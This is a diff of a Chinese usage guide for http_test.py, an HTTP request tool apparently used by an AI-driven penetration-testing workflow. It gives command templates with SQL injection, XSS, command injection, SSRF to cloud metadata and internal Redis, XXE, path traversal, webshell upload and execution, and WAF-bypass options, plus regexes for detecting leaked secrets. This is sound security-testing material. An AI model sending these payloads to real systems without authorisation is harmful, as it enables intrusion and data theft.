@@ -1,17 +1,15 @@
-# http_test.py — vibe-csa Stage 2 发包工具完整用法
+# http_test.py — 纯 Python HTTP 发包工具完整用法
 
 ## 概述
 
-`http_test.py` 是 vibe-csa Stage 2 动态验证阶段**唯一允许使用的 HTTP 发包工具**。
+`http_test.py` 是 漏洞验证、渗透测试中**唯一推荐使用的 HTTP 发包工具**。
 
 - 基于 `httpx` 的纯 Python 实现，无外部二进制依赖
-- `--show-command` 输出完整请求概览（方法/URL/Headers/Body）→ 直接回填 `poc.steps[].request.raw`
-- `--include-headers` 输出完整响应头（状态行+所有 Header）→ 直接回填 `poc.steps[].response.headers`
-- `--show-summary` 输出性能指标（DNS/TCP/TLS/TTFB）→ 用于时序盲注证据
-- 智能 Body 编码（自动推断 Content-Type、form URL-encode、JSON 序列化）
-- 响应体过滤瘦身（`--response-filter` + `--response-max-lines`）→ 只提取证据片段
-
-**依赖**：`pip install httpx charset-normalizer`
+- 智能 Body 编码（自动推断 charset、form URL-encode、JSON、二进制）
+- 连接探针（DNS / TCP / TLS 独立计时）
+- 响应体过滤和瘦身（正则过滤 + 行/字节截断），显著减少 Token 消耗
+- 重复请求 + 聚合统计（盲注 / 时序测试）
+- 自动字符集检测和响应解码
 
 **位置**：`{SKILL_ROOT}/scripts/http_test.py`
 
@@ -19,59 +17,141 @@
 
 ## 快速开始
 
-### 基础 PoC 验证请求
+> PowerShell 兼容说明：
+> - 本节代码块使用 `bash` 风格续行符 `\`，在 PowerShell 中请改为单行执行，或使用反引号 `` ` `` 续行。
+> - 表单字段优先使用 `--form`；复杂、较长或需保持原始格式的请求体优先使用 `--data-file body.txt`。旧写法 `--data "@body.txt"` 仍可用，但必须带引号，避免与 splatting 语法冲突。
+> - 若命令已出现多层引号、复杂 `--headers` JSON 或进入 `>>` 续行提示，应立即改用专用参数、改写 payload，或改走文件输入，而不是继续硬转义。
+> - 复杂正则包含 `$`、引号或换行时，优先将正则写入文件并使用 `--response-filter-file regex.txt`。
 
+### 基础 GET 请求
 ```bash
 python {SKILL_ROOT}/scripts/http_test.py \
-  --url "TARGET_URL" \
+  --url "http://target.com/path" \
   --method GET \
   --show-command \
   --show-summary \
   --include-headers \
-  --response-max-lines 100
+  --response-max-lines 80
 ```
 
-### POST JSON 数据（PoC payload 发送）
-
+### POST JSON 数据
 ```bash
 python {SKILL_ROOT}/scripts/http_test.py \
-  --url "TARGET_API" \
+  --url "http://target.com/api/endpoint" \
   --method POST \
   --data '{"key":"value"}' \
   --headers '{"Content-Type":"application/json"}' \
   --show-command \
   --show-summary \
   --include-headers \
-  --response-max-lines 100
+  --response-max-lines 80
 ```
 
-### 带 Cookie 认证的 PoC 验证
-
+### POST 表单数据
 ```bash
-# 先从 workDir/sessions/creds.json 提取 Cookie
 python {SKILL_ROOT}/scripts/http_test.py \
-  --url "TARGET_URL" \
-  --method GET \
-  --cookies "PHPSESSID=xxx; token=yyy" \
+  --url "http://target.com/login" \
+  --method POST \
+  --form '{"username":"admin","password":"test123"}' \
   --show-command \
   --show-summary \
   --include-headers \
-  --response-max-lines 100
+  --response-max-lines 80
 ```
+
+表单字段优先使用 `--form` 结构化传入，由工具安全编码并自动设置 `application/x-www-form-urlencoded`；`--data` 保留给原始请求体或需要精确控制编码的场景； 二进制、较长或易受 shell 转义影响的请求体使用 `--data-file`。
 
 ---
 
-## 漏洞验证场景模板
+## 参数速查表
 
-### 场景 1: SQL 注入验证（错误回显检测）
+### 请求控制
+
+| 参数 | 类型 | 默认值 | 说明 |
+|------|------|--------|------|
+| `--url` | string | (必填) | 目标URL |
+| `--method` | string | `GET` | HTTP方法：GET/POST/PUT/PATCH/OPTIONS/HEAD |
+| `--data` | string | `""` | 原始请求体；支持 JSON、XML、文本、已构造表单体、兼容旧写法 `@file` 或 `@-` |
+| `--data-file` | string | `""` | 从文件原样加载请求体；推荐优先使用，尤其在 PowerShell 中 |
+| `--form` | JSON object | `""` | 结构化表单字段；安全编码字段值并自动设置 `application/x-www-form-urlencoded` |
+| `--headers` | object/string | `""` | 请求头，支持 JSON 字典 `{"Key":"Val"}` 或 `"Key: Val"` 字符串 |
+| `--cookies` | string | `""` | Cookie字符串：`"PHPSESSID=xxx; token=yyy"` |
+| `--user-agent` | string | `""` | 自定义 User-Agent |
+| `--proxy` | string | `""` | 代理地址：`http://127.0.0.1:8080` 或 `socks5://127.0.0.1:1080` |
+| `--timeout` | float | `60` | 超时秒数（支持小数） |
+| `--follow-redirects` | bool | `false` | 跟随 HTTP 重定向 |
+| `--allow-insecure` | bool | `false` | 忽略 TLS 证书错误（verify=False） |
+| `--auto-encode-url` | bool | `false` | URL 特殊字符自动编码 |
+
+### 响应输出控制
+
+| 参数 | 类型 | 默认值 | 说明 |
+|------|------|--------|------|
+| `--show-command` | bool | `true` | 输出请求概览（方法/URL/Headers/Body）；使用 `--no-show-command` 关闭 |
+| `--show-summary` | bool | `true` | 输出性能指标（DNS/TCP/TLS/TTFB/Total/Speed）；使用 `--no-show-summary` 关闭 |
+| `--include-headers` | bool | `true` | 输出响应头（状态行+所有Header）；使用 `--no-include-headers` 关闭 |
+| `--verbose-output` | bool | `false` | 输出额外调试信息 |
+| `--debug` | bool | `false` | Body 编码处理细节 |
+| `--response-encoding` | string | `""` | 强制响应解码字符集（如 `gbk`、`shift_jis`） |
+| `--download` | string | `""` | 响应体保存到本地文件，支持 `{i}` 序号占位符 |
+
+以上三项默认开启，以满足漏洞验证和 findings 证据回填需求；仅在无需留存对应证据时使用 `--no-show-command`、`--no-show-summary` 或 `--no-include-headers` 按需关闭。
+
+### 响应体过滤（Token 优化核心功能）
+
+| 参数 | 类型 | 默认值 | 说明 |
+|------|------|--------|------|
+| `--response-filter` | regex | `""` | 正则过滤响应体（默认按行匹配），优先使用 |
+| `--response-filter-file` | file | `""` | 从文件读取响应体过滤正则；适合复杂正则或 Shell 转义敏感场景 |
+| `--response-filter-mode` | string | `line` | 过滤模式：`line`(按行)/`multiline`(跨行块)/`full`(全文DOTALL) |
+| `--response-filter-invert` | bool | `false` | 反向过滤：输出不匹配的行（剔除HTML噪音） |
+| `--response-filter-ignore-case` | bool | `false` | 正则忽略大小写（等价 `(?i)`） |
+| `--response-max-lines` | int | `0` | stdout最多输出行数（0=不限制） |
+| `--response-max-bytes` | int | `0` | stdout UTF-8字节上限（0=不限制） |
+| `--response-preview-lines` | int | `5` | filter 零命中时的预览行数 |
+| `--response-context-lines` | int | `0` | line模式命中行上下各保留N行上下文（类似 grep -C） |
+
+### 常用证据过滤模板
+
+用于从响应体中提取候选证据，默认采用 `line` 模式：
+
+- 唯一标识回显：`<UNIQUE_MARKER>`
+- 精确预期值：`<EXPECTED_VALUE>`
+- JSON 关键字段：`(?i)"?<FIELD_NAME>"?\s*:\s*"?<EXPECTED_VALUE>"?`
+- 服务端异常栈：`(?i)(Traceback \(most recent call last\)|Fatal error:|Uncaught .*Exception|java\.[\w.$]+Exception|SQLSTATE\[)`
+- SQL 注入错误：`(?i)(SQL syntax.*MySQL|Warning.*mysql_|MySqlClient\.|SQLSTATE\[|ORA-\d{4,5}|PostgreSQL.*ERROR|SQLite/JDBCDriver|Microsoft OLE DB Provider for SQL Server)`
+- 敏感信息泄露：`(?i)(password|passwd|api[_-]?key|access[_-]?token|client[_-]?secret)\s*[:=]|-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----`
+- SSRF 服务响应：`(?i)(redis_version|redis_mode|SSH-\d|220[ -].*SMTP|MongoDB|Elasticsearch|<title>.*(consul|jenkins|kibana))`
+- 命令执行（Unix `id`）：`uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)`
+- 命令执行（Windows `ipconfig`）：`(?i)(Windows IP Configuration|IPv4 Address|Subnet Mask|Default Gateway)`
+- XXE / LFI / 路径穿越（`/etc/passwd`）：`(?i)(root:.*:0:0:|daemon:.*:/|nobody:.*:/|/bin/(ba)?sh)`
+- XXE / LFI / 路径穿越（`Windows/win.ini`）：`(?i)(\[fonts\]|\[extensions\]|\[mci extensions\]|\[files\])`
+- XXE / LFI / 路径穿越（`WEB-INF/web.xml`）：`(?i)(<web-app|<servlet|<servlet-mapping|<filter-mapping|<welcome-file-list)`
+
+以上仅为常见示例，实际应根据目标输入、数据流、Sink、解析器及预期证据扩展或组合模板。替换占位符；跨行内容使用 `multiline` 或 `full`。命中结果仍需结合基线和对照请求确认。
+
+
+### 高级功能
+
+| 参数 | 类型 | 默认值 | 说明 |
+|------|------|--------|------|
+| `--repeat` | int | `1` | 重复请求次数（≥1） |
+| `--delay` | float | `0` | 重复请求间隔秒数（支持小数） |
+| `--additional-args` | string | `""` | httpx.Client额外选项：`"http2=true cert=/path/cert.pem verify=false max_redirects=5"` |
+
+---
+
+## 渗透测试场景模板
+
+### 场景1: SQL 注入测试（POST，错误过滤）
 
 ```bash
 python {SKILL_ROOT}/scripts/http_test.py \
   --url "TARGET_URL" \
   --method POST \
-  --data "id=1'" \
+  --data "id=1' OR '1'='1" \
   --headers '{"Content-Type":"application/x-www-form-urlencoded"}' \
-  --response-filter '(?i)(error|exception|syntax|mysql|sql|warning|ora-|sqlstate|postgresql|debug|trace|fatal)' \
+  --response-filter '(?i)(error|exception|syntax|mysql|sql|database|warning|debug|trace|stack|fatal|ora-|sqlstate|postgresql)' \
   --response-filter-mode line \
   --response-context-lines 2 \
   --response-max-lines 40 \
@@ -80,257 +160,97 @@ python {SKILL_ROOT}/scripts/http_test.py \
   --include-headers
 ```
 
-**证据判定**：响应中出现数据库错误关键字 → `poc.evidence` 引用具体行
-**对应 evidence_contract**：`EVID_SQL_EXEC_POINT` → 运行时确认
-
-### 场景 2: SQL 注入验证（布尔/时间盲注）
+### 场景2: XSS 测试（payload 回显检测）
 
 ```bash
-# 恒真条件
 python {SKILL_ROOT}/scripts/http_test.py \
-  --url "TARGET_URL?id=1' OR '1'='1" \
+  --url "TARGET_URL?search=%3Cscript%3Ealert%28%27xss_test%27%29%3C%2Fscript%3E" \
   --method GET \
-  --show-command --show-summary --include-headers --response-max-lines 30
-
-# 恒假条件（对照）
-python {SKILL_ROOT}/scripts/http_test.py \
-  --url "TARGET_URL?id=1' OR '1'='2" \
-  --method GET \
-  --show-command --show-summary --include-headers --response-max-lines 30
-
-# 时间盲注（重复 5 次观察 TTFB）
-python {SKILL_ROOT}/scripts/http_test.py \
-  --url "TARGET_URL?id=1' AND SLEEP(5)--" \
-  --method GET \
-  --repeat 5 --delay 0.3 --show-summary --response-max-lines 0
+  --response-filter '<script>alert' \
+  --response-filter-mode full \
+  --response-max-lines 20 \
+  --show-command \
+  --include-headers
 ```
 
-### 场景 3: 命令注入/RCE 验证
+### 场景3: Blind SQLi / 时序差异验证
+
+适用于时间型 SQL/NoSQL 盲注、延迟型命令执行及其他需要多次请求比较响应耗时的场景；布尔型盲注可用基线/true/false 请求配合 `--response-filter`、响应关键词或 `Size Download` 对比。
+
+验证前先确认稳定基线输入；时间型盲注应构造 true/false 两组 payload，并在相同 `--repeat` / `--delay` 条件下比较聚合统计，不得仅凭单次慢响应确认。该工具用于验证与取证，不负责自动化枚举。
 
 ```bash
 python {SKILL_ROOT}/scripts/http_test.py \
   --url "TARGET_URL" \
-  --method POST \
-  --data "cmd=;id" \
-  --response-filter '(?i)(uid=|gid=|groups=)' \
-  --response-filter-mode line \
-  --response-context-lines 1 \
-  --show-command --show-summary --include-headers
+  --method GET \
+  --repeat 5 \
+  --delay 0.5 \
+  --show-summary \
+  --response-max-lines 0
 ```
 
-**证据判定**：响应中出现 `uid=...` → `poc.evidence` 引用命令输出原文
-**对应 evidence_contract**：`EVID_RCE_EXEC_POINT` → 运行时确认
-
-### 场景 4: SSRF 内网探测
+### 场景4: 认证测试（带Cookie）
 
 ```bash
-# 云元数据探测
 python {SKILL_ROOT}/scripts/http_test.py \
-  --url "TARGET_URL?url=http://169.254.169.254/latest/meta-data/" \
+  --url "TARGET_URL" \
+  --method GET \
+  --cookies "PHPSESSID=xxx; token=yyy" \
+  --show-command \
+  --show-summary \
+  --include-headers \
+  --response-max-lines 80
+```
+
+### 场景5: SSRF 内网探测（快速超时+错误过滤）
+
+```bash
+python {SKILL_ROOT}/scripts/http_test.py \
+  --url "TARGET_URL/api/fetch?url=http://127.0.0.1:6379/" \
   --method GET \
   --timeout 5 \
-  --response-filter '(?i)(ami-id|instance-id|security-groups|public-keys)' \
+  --response-filter '(?i)(redis|connection|refused|timeout|error)' \
   --response-filter-mode line \
-  --show-command --show-summary --include-headers
-
-# 内网端口探测
-python {SKILL_ROOT}/scripts/http_test.py \
-  --url "TARGET_URL?url=http://127.0.0.1:6379/" \
-  --method GET \
-  --timeout 3 \
-  --response-filter '(?i)(redis|connection|refused|timeout|welcome|-ERR)' \
-  --show-command --show-summary --include-headers
+  --show-summary \
+  --include-headers
 ```
 
-### 场景 5: 路径穿越/LFI 文件读取
+### 场景6: 原始二进制请求体（@file 加载）
 
 ```bash
-python {SKILL_ROOT}/scripts/http_test.py \
-  --url "TARGET_URL/download?file=../../etc/passwd" \
-  --method GET \
-  --response-filter '(?i)(root:|nobody:|daemon:|bin:.*:/bin/bash)' \
-  --response-filter-mode line \
-  --response-context-lines 1 \
-  --show-command --show-summary --include-headers
-```
-
-**证据判定**：响应中出现 `/etc/passwd` 内容 → `poc.evidence` 引用 root/nobody 行
-**对应 evidence_contract**：`EVID_FILE_OP_POINT` + `EVID_FILE_NO_PATH_VALIDATION`
-
-### 场景 6: XXE 验证
-
-```bash
-python {SKILL_ROOT}/scripts/http_test.py \
-  --url "TARGET_URL/api/xml" \
-  --method POST \
-  --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' \
-  --headers '{"Content-Type":"application/xml"}' \
-  --response-filter '(?i)(root:|nobody:|daemon:)' \
-  --show-command --show-summary --include-headers
-```
-
-### 场景 7: 文件上传验证（两步串联）
-
-```bash
-# Step 1: 上传 marker 文件
-python {SKILL_ROOT}/scripts/http_test.py \
-  --url "TARGET_URL/upload" \
-  --method POST \
-  --data @test_marker.html \
-  --headers '{"Content-Type":"multipart/form-data"}' \
-  --show-command --show-summary --include-headers
-
-# Step 2: 访问确认 marker
-python {SKILL_ROOT}/scripts/http_test.py \
-  --url "TARGET_URL/uploads/test_marker.html" \
-  --method GET \
-  --response-filter 'CSA_MARKER_STRING_12345' \
-  --response-filter-mode full \
-  --show-command --show-summary --include-headers
-```
-
-### 场景 8: 文件上传 → RCE（三步串联）
-
-```bash
-# Step 1: 上传 webshell 脚本
 python {SKILL_ROOT}/scripts/http_test.py \
   --url "TARGET_URL/upload" \
   --method POST \
   --data @shell.php \
-  --show-command --show-summary --include-headers
-
-# Step 2: 访问 webshell 确认存在（无参数 GET）
-python {SKILL_ROOT}/scripts/http_test.py \
-  --url "TARGET_URL/uploads/shell.php" \
-  --method GET \
-  --show-command --show-summary --include-headers --response-max-lines 10
-
-# Step 3: 执行命令验证 RCE
-python {SKILL_ROOT}/scripts/http_test.py \
-  --url "TARGET_URL/uploads/shell.php?cmd=id" \
-  --method GET \
-  --response-filter '(?i)(uid=|groups=)' \
-  --response-filter-mode line \
-  --show-command --show-summary --include-headers
+  --headers '{"Content-Type":"application/octet-stream"}' \
+  --show-command \
+  --show-summary \
+  --include-headers \
+  --response-max-lines 40
 ```
 
-### 场景 9: 认证绕过/IDOR（A-B 账号跨权限对比）
+---
+
+## 响应过滤最佳实践
+
+### 原则：永远不要让整页 HTML 进入上下文
 
 ```bash
-# 账号 A 访问自己的资源
-python {SKILL_ROOT}/scripts/http_test.py \
-  --url "TARGET_URL/api/user/1001/profile" \
-  --method GET \
-  --cookies "session=COOKIE_USER_A" \
-  --show-command --show-summary --include-headers --response-max-lines 80
+# ❌ 错误：整页HTML灌入上下文，浪费Token
+python http_test.py --url "http://target.com/page" --method GET
 
-# 账号 B 用 A 的资源 ID 访问（越权测试）
-python {SKILL_ROOT}/scripts/http_test.py \
-  --url "TARGET_URL/api/user/1001/profile" \
-  --method GET \
-  --cookies "session=COOKIE_USER_B" \
-  --show-command --show-summary --include-headers --response-max-lines 80
+# ✅ 正确：限制行数 + 关键词过滤
+python http_test.py --url "http://target.com/page" --method GET \
+  --response-max-lines 80 \
+  --response-filter '(?i)(error|warning|version|token|password|admin|debug|exception|trace)'
 ```
 
-### 场景 10: JWT 篡改验证
+### 无过滤结果的处理
 
-```bash
-# 原 Token 请求（基线）
-python {SKILL_ROOT}/scripts/http_test.py \
-  --url "TARGET_URL/api/admin" \
-  --method GET \
-  --headers '{"Authorization":"Bearer ORIGINAL_TOKEN"}' \
-  --show-command --show-summary --include-headers
+当 `--response-filter` 零命中时，工具会自动输出前 `--response-preview-lines` 行（默认5行）作为预览，帮助判断是否需要调整正则。输出会标记 `[body] no regex match; showing preview:`.
 
-# 篡改 Token 请求（变体）
-python {SKILL_ROOT}/scripts/http_test.py \
-  --url "TARGET_URL/api/admin" \
-  --method GET \
-  --headers '{"Authorization":"Bearer TAMPERED_TOKEN"}' \
-  --show-command --show-summary --include-headers
-```
+### 二进制/大响应处理
 
----
-
-## http_test.py 输出 → finding JSON 字段映射
-
-这是 vibe-csa 最关键的映射关系。每个 http_test.py 调用的输出直接对应 finding 文件的证据字段：
-
-| http_test.py 输出段落 | 对应 finding 字段 | 说明 |
-|---|---|---|
-| `===== Prepared Request =====` | `poc.steps[].request.raw` | 完整请求概览 |
-| `Method: GET/POST/...` | `poc.steps[].request.method` | HTTP 方法 |
-| `URL: http://...` | `poc.steps[].request.url` | 完整目标 URL |
-| `Headers (N total):` + `Key: Value` | `poc.steps[].request.headers` | 请求头（JSON dict） |
-| `Body: N bytes (mode, charset=...)` | `poc.steps[].request.body` | 请求体信息 |
-| `===== Response #N =====` | `poc.steps[].response.raw` | 完整响应段落 |
-| `HTTP/1.1 200 OK` | `poc.steps[].response.status_code` | 200 |
-| 响应头 Key: Value | `poc.steps[].response.headers` | 响应头（JSON dict） |
-| `----- Meta #N -----` | `poc.steps[].response._evidence_match[]` | 性能指标/证据级别 |
-| `[body] matched N/M lines` | `response._evidence_match[].snippet` | 匹配的响应体片段 |
-| `Encoding Used: utf-8 (header)` | `response._evidence_match[].encoding_source` | 编码来源 |
-| `[body] no regex match; showing preview:` | `response._evidence_match[].strength=L1` | 未匹配到证据关键词 |
-
-### 回填示例
-
-```json
-{
-  "poc": {
-    "steps": [{
-      "name": "SQL注入基线探测",
-      "request": {
-        "method": "POST",
-        "url": "http://target.com/login",
-        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
-        "body": "username=admin' OR '1'='1&password=test",
-        "raw": "===== Prepared Request =====\nMethod: POST\nURL: http://target.com/login\n..."
-      },
-      "response": {
-        "status_code": 200,
-        "headers": {"Server": "Apache/2.4.65", "X-Powered-By": "PHP/8.1.34"},
-        "body": "...",
-        "raw": "===== Response #1 =====\nHTTP/1.1 200 OK\n...",
-        "_evidence_match": [
-          {"type": "regex", "pattern": "(?i)(error|syntax|mysql|sql|warning)", "strength": "L2", "snippet": "  L42: <b>Warning</b>: mysql_fetch_array() expects parameter 1 to be resource..."}
-        ]
-      }
-    }]
-  }
-}
-```
-
----
-
-## 绕过重试用 http_test.py 特殊参数
-
-当基线 PoC 被拦截/过滤/返回异常时，先回读源码分析原因，再用以下参数组合重试：
-
-| 被拦截原因 | http_test.py 应对参数 |
-|---|---|
-| WAF/403 拦截 | `--user-agent "Mozilla/5.0" --additional-args "trust_env=false"` |
-| 重定向到登录页 | `--follow-redirects --response-filter '(?i)(welcome|dashboard|admin|profile)'` |
-| TLS 证书错误 | `--allow-insecure` |
-| URL 特殊字符被截断 | `--auto-encode-url` |
-| Content-Type 解析差异 | 切换 `--data` 格式（JSON → form → XML） |
-| HTTP/2 走私 | `--additional-args "http2=true"` |
-| 编码探测 | `--response-encoding gbk` 或 `shift_jis` |
-| 大响应截断 | `--download response.bin --response-max-lines 5` |
-| 时序盲注 | `--repeat 5 --delay 0.5 --show-summary` |
-
----
-
-## 常用过滤正则模板（对应漏洞类型）
-
-| 漏洞类型 | 证据过滤正则 |
-|---------|------------|
-| SQL 注入 | `'(?i)(error\|syntax\|mysql\|sql\|warning\|ora-\|sqlstate\|postgresql\|debug\|trace\|fatal\|exception)'` |
-| 命令注入/RCE | `'(?i)(uid=\|gid=\|root:\|daemon:\|bin/bash\|Microsoft Windows\|Linux\|/bin/\|/usr/)'` |
-| 命令注入（时间盲注） | 不用 filter，用 `--repeat 5 --delay 0.3 --show-summary` 观察 TTFB |
-| SSRF（元数据） | `'(?i)(ami-id\|instance-id\|security-groups\|public-keys\|computeMetadata\|169\.254)'` |
-| SSRF（内网探测） | `'(?i)(redis\|connection refused\|timeout\|banner\|-ERR\|+OK\|welcome)'` |
-| LFI/路径穿越 | `'(?i)(root:\|<?php\|\[extensions\]\|daemon:\|nobody:\|boot\.ini\|bin/bash)'` |
-| XXE | `'(?i)(root:\|daemon:\|nobody:\|DOCTYPE\|ENTITY\|SYSTEM)'` |
-| XSS（反射型） | `'<script>'` 或 `'(?i)(alert\|onerror\|onload\|onclick\|eval)'` |
-| 信息泄露 | `'(?i)(password\|api_key\|token\|secret\|private\|internal\|admin\|DB_\|DATABASE)'` |
-| 模板注入/SSTI | `'(?i)(49\|7777777\|<class\|__class__\|TypeError\|UndefinedError\|TemplateSyntaxError)'` |
-| 认证绕过 | `'(?i)(welcome\|dashboard\|admin\|profile\|unauthorized\|forbidden\|login\|redirect\|session)'` |
+- 使用 `--download output.bin` 将响应体保存到本地文件
+- 使用 `--response-max-lines 3` 只摘要输出
+- 多次请求时用 `--download "run-{i}.bin"` 自动序号区分
